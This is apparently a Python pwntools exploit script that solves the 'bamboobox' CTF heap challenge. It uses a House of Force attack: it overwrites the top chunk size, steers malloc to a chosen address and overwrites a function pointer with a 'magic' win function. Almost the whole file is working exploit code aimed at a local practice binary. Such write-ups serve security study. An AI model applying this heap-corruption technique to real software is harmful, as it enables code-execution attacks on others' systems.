#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
r = process('./bamboobox')

def additem(length,name):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil("name:")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
def modify(idx,length,name):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(name)
def remove(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
def show():
    r.recvuntil(":")
    r.sendline("1")


magic = 0x400d49
raw_input("malloc item0")
additem(0x40,"AAAA")

#raw_input("modify item0,overite size of top chunk")
modify(0,0x50,"a"*0x40 + p64(0) + p64(0xffffffffffffffff))

#raw_input("add a large chunk,control top chunk")
additem(0x603010 - 0x603070 - 2*8 - 8,"BBBB")

#raw_input("return target,overwrite function ptr")
additem(0x20,p64(magic)*2)

#raw_input("exit")
r.sendline('5')
r.recvuntil("Your choice:")
print r.recvuntil("}")

